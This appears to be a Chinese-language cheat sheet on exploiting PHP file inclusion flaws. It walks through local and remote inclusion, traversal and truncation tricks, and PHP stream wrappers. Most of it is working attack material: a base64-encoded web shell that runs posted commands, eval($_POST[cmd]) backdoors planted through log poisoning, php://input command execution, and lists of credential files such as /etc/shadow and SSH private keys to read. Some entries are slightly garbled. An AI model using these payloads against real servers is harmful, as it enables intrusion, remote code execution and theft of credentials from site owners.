---
title: "php 文件包含"
date: 2016-02-24 16:47
---

## 0x01 与文件包含相关的函数

```
require         找不到被包含的文件时会产生致命错误，并停止脚本运行。
include         找不到被包含的文件时只会产生警告，脚本将继续运行。
include_once    与include类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。
require_once    与require类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含
```

## 0x02 本地文件包含(LFI--Local File Include)

### 普通本地包含

只要网站支持上传，上传任意后缀文件，被包含的文件中含有效的php代码，则引入当前文件执行，若不含有效php代码，则直接输出文件内容

样例：

```
# lfi.php
<?php include($_GET['file']); ?>
```

** 利用 **

#### 注入有效 php 代码

```
echo "<?php phpinfo();" >> lfi.txt

# browser
http://127.0.0.1/lfi.php?file=lfi.txt
```

#### 目录遍历

```
# linux 这两个文件存储着所有文件的路径，需要root权限
?file=../../../../../../../var/lib/mlocate/mlocate.db
?file=../../../../../../../var/lib/locate.db
```

#### 包含错误日志

```
?ile=../../../../../../../../var/log/apache/error.log
```

#### 获取web目录或配置文件

```
?file=../../../../../../../../usr/local/apache2/conf/httpd.conf
```

#### 包含上传附件

```
?file=../attachment/media/xx.file
```

#### 读取 session 文件

```
?file=../../../../../../../tmp/sess_xxxxx
```

session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell

#### 如果拥有root权限还可以试试读这些东西：

```
/root/.ssh/authorized_keys

/root/.ssh/id_rsa

/root/.ssh/id_rsa.keystore

/root/.ssh/id_rsa.pub

/root/.ssh/known_hosts

/etc/shadow

/root/.bash_history

/root/.mysql_history

/proc/self/fd/fd[0-9]* (文件标识符)

/proc/mounts

/proc/config.gz
```

### 截断本地包含

样例：

```
include($a.".php");
```

* 长文件名截断

php版本小于5.2.8(?)可以成功

windows和linux的文件名长度是有限制的，超过其长度的会被忽略，通常情况下windows的截断长度为260，linux的长度为4096，这一不用在意具体长度，只要把需要截断的字符串挤到后面就可以了

样例：

```
<?php  include_once($_GET['f'].".php"); ?>  

# POC
http://127.0.0.1/test/123.php?f=test.txt/././....../

```
实例：

[长文件名截断: 济南大学主站本地文件包含导致代码执行][3]

1windows

windows在文件名后加/.  或 \.都是可以的

```
\.
./
/
\
```

2linux

```
./
/
```

* 点号截断：

?file=../../../../../../../../../boot.ini/......

(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)

* %00 截断包含

> gpc=off 和 php 版本限制

## 0x03 远程包含

allow_url_include=On 就是远程文件包含，Off就是本地文件包含

> “zlib://”和“ogg://”等方式绕过 远程文件包含(RFI)

## 0x04 php 自带协议


### ** data:// ** 

Streams can be used with functions such as file_get_contents, fopen, include and require etc. and this is where the danger of Remote and Local file inclusion occur

> php>5.2, allow_url_include=On

```
# base64 decode is 'I love PHP\n'
echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo=');

# index.php
<? include($_GET['file'] . ".php");

# phpinfo
<? phpinfo(); die();?>

:::php
// Base64 Encoded
PD8gcGhwaW5mbygpOyBkaWUoKTs/Pg==

// URL + Base64 Encoded
PD8gcGhwaW5mbygpOyBkaWUoKTs%2fPg==

// Final URL
index.php?file=data://text/plain;base64,PD8gcGhwaW5mbygpOyBkaWUoKTs%2fPg==
```

gui command shell:

```
# GUI command shell.

# PHP Payload
<form action="<?=$_SERVER['REQUEST_URI']?>" method="POST"><input type="text" name="x" value="<?=htmlentities($_POST['x'])?>"><input type="submit" value="cmd"></form><pre><? echo `{$_POST['x']}`; ?></pre><? die(); ?>

# Base64 encoded payload

PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8+IiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT8+Ij48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0+PHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8+PC9wcmU+PD8gZGllKCk7ID8+Cgo=

# Base64 + URL encoded payload
PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT82BIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2BPHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8%2BPC9wcmU%2BPD8gZGllKCk7ID8%2BCgo%3D
```

### ** php://input ** -- 

可以访问请求的原始数据的只读流(这个原始数据指的是POST数据)

>  php5.0以下 和 php5.2 版本有效, allow_url_include=On

LFI 导致 code excute

```
<?php 
　　@eval(file_get_contents('php://input'))
?> 
http://localhost/test/index.php
post: system("dir");
result: list directory
```

这本质上远程文件包含的利用，远程文件包含中的include接收的是一个"资源定位符"，在大多数情况下这是一个磁盘文件路径，但是从流的角度来看，这也可以是一个流资源定位符，即我们将include待包含的资源又重定向到了输入流中，从而可以输入我们的任意code到include中

```
<?php
　　@include($_GET["file"]);
?>
http://localhost/test/index.php?file=php://input
post: <?php system('ipconfig');?>
result: ip information
```

有一点要注意:

```
<?php echo file_get_contents("solution.php");?>
```

在利用文件包含进行代码执行的时候，我们通过file_get_contents获取到的文件内容，如果是一个.php文件，会被当作include的输入参数，也就意味着会被再执行一次，则我们无法看到原始代码了

解决这个问题的方法就是使用base64_encode进行编码

```
<?php echo base64_encode(file_get_contents("solution.php"));?>
```

### ** php://filter **-- 利用主要是利用了resource和vonvert，这样可以读取到php的代码 =========================

ctf 赛事中，url参数值出现很像文件名的情况下，很有可能是 本地文件包含， 可利用 filter 协议读源码， 通常 flag 在 flag.php info.php phpinfo.php 这几个文件中，优先考虑

> php5.0以上

```
?url=php://filter/convert.base64-encode/resource=test.txt 

?url=php://filter/convert.base64-encode/resource=http://127.0.0.1/test/test.txt
```

实战：

```
$ curl ctf.sharif.edu:31455/chal/technews/634770c075a17b83/images.php?id=php://filter/resource=files/images/robot.jpg/resource=files/flag/flag.txt
```

向磁盘写文件

```
<?php
　　/* 这会通过 rot13 过滤器筛选出字符 "Hello World"
　　然后写入当前目录下的 example.txt */
　　file_put_contents("php://filter/write=string.rot13/resource=example.txt","Hello World");
?>
```

这个参数采用一个或以管道符 | 分隔的多个过滤器名称

### ** php://fd **

> php 5.3.6中新增加

### zip://

> allow_url_fopen=no

```
# zip 内含目录
zip://archive.zip#dir/file.txt 

# url 中使用 "%23"(#)
?f=zip://path_to_zip%23inside_file_name
```

文件压缩成zip包，压缩的时候注意要选择only store之类的选项，防止数据被压缩

```
zip -0 1.zip shell.php
```

** 额外支持 **

```
fopen('zip://path/xx.zip#inside_file_name')
file_get_contents()
imagecreatefromgif()
```

### phar://

```
?f=phar://php.zip/php.jpg
```

与zip协议区别就是 phar 是用/来分隔而不是 #

* ** glob **

> php>5.3.0

```
DirectoryIterator(“glob://ext/spl/examples/*.php”)
```

```
<?php
　　// 循环 ext/spl/examples/ 目录里所有 *.php 文件
　　// 并打印文件名和文件尺寸
　　$it = new DirectoryIterator("glob://E:\\wamp\\www\\test\\*.php");
　　foreach($it as $f) 
　　{
　　　　printf("%s: %.1FK\n", $f->getFilename(), $f->getSize()/1024);
　　}
?>
```

### file://

越权访问本地文件

file:// — 访问本地文件系统; 文件系统是PHP使用的默认封装协议，展现了本地文件系统

```
<?php
　　$res = file_get_contents("file://E://wamp//www//test//solution.php");
　　var_dump($res);
?>
```

file://这个伪协议可以展示"本地文件系统"，当存在某个用户可控制、并得以访问执行的输入点时，我们可以尝试输入file://去试图获取本地磁盘文件

http://www.wechall.net/challenge/crappyshare/index.php

http://www.wechall.net/challenge/crappyshare/crappyshare.php

在这题CTF中，攻击的关键点在于：curl_exec($ch)

```
function upload_please_by_url($url)
{ 
　　if (1 === preg_match('#^[a-z]{3,5}://#', $url)) # Is URL? 
　　{
　　　　$ch = curl_init($url);
　　　　curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
　　　　curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
　　　　curl_setopt($ch, CURLOPT_FAILONERROR, true);
　　　　if (false === ($file_data = curl_exec($ch)))
　　　　{
　　　　　　htmlDisplayError('cURL failed.');
　　　　}
　　　　else
　　　　{
　　　　　　// Thanks
　　　　　　upload_please_thx($file_data);
　　　　}
　　}
　　else
　　{
　　　　htmlDisplayError('Your URL looks errorneous.');
　　}
}
```

当我们输入的file://参数被带入curl中执行时，原本的远程URL访问会被重定向到本地磁盘上，从而达到越权访问文件的目的

## 0x04 包含Session文件

包含Session文件的条件也较为苛刻，它需要攻击者能够"控制"部分Session文件的内容。

```
x|s:19:"<?php phpinfo(); ?>"
```

PHP默认生成的Session文件往往存放在/tmp目录下

```
/tmp/sess_SESSIONID
```

## 0x05 包含/proc/self/environ文件

包含/proc/self/environ是一种更通用的方法，因为它根本不需要猜测包包含文件的路径，同时用户也能控制它的内容

```
http://192.168.159.128/index.php?file=../../../../../../../proc/self/environ
```

## 0x06 日记包含高级利用

[济南大学主站本地文件包含导致代码执行][3]

限制

> 类似http://www.exp.com/index<?php eval($_POST[cmd]);?>.php 
这样的提交，某些WEB服务器将会把空格做HTTP编码转成%20写入web日志,如果PHP包含<?php%20eval($_POST[cmd]);?>这样的语句肯定是不会成功的，所以我们必须把空格真正的写入WEB日志.

突破

```
<?/**/eval($_POST[cmd]);/**/?>
```

1.short_open_tag=on
这类情况写入web日志，只能在short_open_tag=on的情况下才能有效，当short_open_tag=off时，PHP将不支持<?/**/eval($_POST[cmd]);/**/?>这样的短语句

2.WEB服务器一个奇怪的特性

如果没有返回响应而WEB服务器又接受了请求，那么请求的内容将原封不动的写入WEB日志，不会进行HTTP编码.

这样我们想个办法一直与WEB服务器保持TCP连接，不让WEB服务器处理响应返回，然后再由客户端的我们中断这次TCP连接，说得这么复杂其实很容易实现.只要在HTTP请求的数据包中去掉Connection HTTP标头值。

利用NC伪造没有Connection HTTP标头的请求包：

```
GET /index< >.php HTTP/1.1
Accept: */*
Accept-Language: zh-cn
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
Host: 192.168.3.44
```

你会发现WEB服务器一直不会返回响应，直到我们客户端断开这次连接，这个邪恶的空格便写入了WEB日志！

* conf file paths targeted by LFI

```
/etc/apache2/httpd.conf
/etc/httpd/httpd.conf

```

* Popular log file paths targeted by LFI

```
../apache/logs/error.log
../apache/logs/access.log
../../apache/logs/error.log
../../apache/logs/access.log
../../../apache/logs/error.log
../../../apache/logs/access.log
../../../../../../../etc/httpd/logs/acces_log
../../../../../../../etc/httpd/logs/acces.log
../../../../../../../etc/httpd/logs/error_log
../../../../../../../etc/httpd/logs/error.log
../../../../../../../etc/httpd/logs/error_log
../../../../../../../etc/httpd/logs/error.log
../../../../../../../var/www/logs/access_log
../../../../../../../var/www/logs/access.log
../../../../../../../usr/local/apache/logs/access_ log
../../../../../../../usr/local/apache/logs/access. log
../../../../../../../var/log/apache/access_log
../../../../../../../var/log/apache2/access_log
../../../../../../../var/log/apache/access.log
../../../../../../../var/log/apache2/access.log
../../../../../../../var/log/access_log
../../../../../../../var/log/access.log
../../../../../../../var/www/logs/error_log
../../../../../../../var/www/logs/error.log
../../../../../../../usr/local/apache/logs/error_l og
../../../../../../../usr/local/apache/logs/error.l og
../../../../../../../var/log/apache/error_log
../../../../../../../var/log/apache2/error_log
../../../../../../../var/log/apache/error.log
../../../../../../../var/log/apache2/error.log
../../../../../../../var/log/error_log
../../../../../../../var/log/error.log

19. C:\apache\logs\access.log
20. C:\Program Files\Apache Group\Apache\logs\access.log
21. C:\program files\wamp\apache2\logs
22. C:\wamp\logs
23. C:\xampp\apache\logs\error.log

38. C:\apache\logs\error.log
39. C:\Program Files\Apache Group\Apache\logs\error.log
40. C:\wamp\apache2\logs
41. C:\xampp\apache\logs\access.log

```

[3]: http://www.wooyun.org/bugs/wooyun-2011-02236

[5]: http://php.net/manual/zh/features.file-upload.post-method.php
